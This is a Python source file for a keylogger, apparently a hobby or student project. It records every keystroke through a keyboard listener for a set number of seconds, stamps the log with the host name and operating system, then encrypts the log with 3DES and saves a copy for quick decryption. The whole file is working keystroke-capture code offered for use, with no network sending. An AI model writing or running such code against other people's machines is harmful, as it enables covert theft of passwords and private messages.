import os
import time
import argparse
import datetime
import platform
import socket
from Crypto.Cipher import DES3
from Crypto.Random import get_random_bytes
from pynput.keyboard import Key, Listener

# Project root = Almost_Kelogger
PROJECT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))

# Ensure folders exist
LOGS_DIR = os.path.join(PROJECT_DIR, "Logs")
CRYPTO_DIR = os.path.join(PROJECT_DIR, "Cryptography")
os.makedirs(LOGS_DIR, exist_ok=True)
os.makedirs(CRYPTO_DIR, exist_ok=True)

# Argument parser for duration
parser = argparse.ArgumentParser(description="Keylogger with 3DES encryption")
parser.add_argument("--duration", type=int, default=10, help="Duration of logging in seconds")
args = parser.parse_args()

# Generate timestamp for log files
timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

# File names with custom extensions
raw_log = os.path.join(LOGS_DIR, f"key_log_{timestamp}.log")
enc_log = os.path.join(LOGS_DIR, f"e_key_log_{timestamp}.elog")
latest_log = os.path.join(LOGS_DIR, "latest.elog")

start_time = time.time()
keys = []

# Add metadata header
with open(raw_log, "w") as f:
    f.write("=== SESSION METADATA ===\n")
    f.write(f"Timestamp: {timestamp}\n")
    f.write(f"System: {platform.system()} {platform.release()}\n")
    f.write(f"Node: {socket.gethostname()}\n")
    f.write(f"Duration: {args.duration} seconds\n")
    f.write("========================\n\n")

# Capture key presses
def on_press(key):
    keys.append(key)
    write_file(keys)

def write_file(keys):
    with open(raw_log, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(k + ' ')
    keys.clear()

def on_release(key):
    if key == Key.esc:
        return False
    if time.time() - start_time > args.duration:
        return False

print(f"[+] Logging keystrokes for {args.duration} seconds...")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# === Timer Feedback ===
print("\n[+] Logging session ended.")
for i in range(3, 0, -1):
    print(f"[!] Encrypting logs in {i}...", end="\r")
    time.sleep(1)

# Load encryption key
key_path = os.path.join(CRYPTO_DIR, "enc_dec.k3des")
with open(key_path, "rb") as f:
    key = f.read()

# Encrypt log file
def encrypt_file(input_file, output_file, key):
    iv = get_random_bytes(DES3.block_size)
    cipher = DES3.new(key, DES3.MODE_OFB, iv)

    with open(input_file, 'rb') as f_in:
        plaintext = f_in.read()

    plaintext += b"\0" * (DES3.block_size - len(plaintext) % DES3.block_size)
    ciphertext = cipher.encrypt(plaintext)

    with open(output_file, 'wb') as f_out:
        f_out.write(iv)
        f_out.write(ciphertext)

# Encrypt and save logs
encrypt_file(raw_log, enc_log, key)

# Copy to latest.elog for quick decryption
with open(enc_log, "rb") as f_enc, open(latest_log, "wb") as f_latest:
    f_latest.write(f_enc.read())

print(f"[+] Logs encrypted → {enc_log}")
print(f"[+] Also saved as {latest_log} for quick decryption")
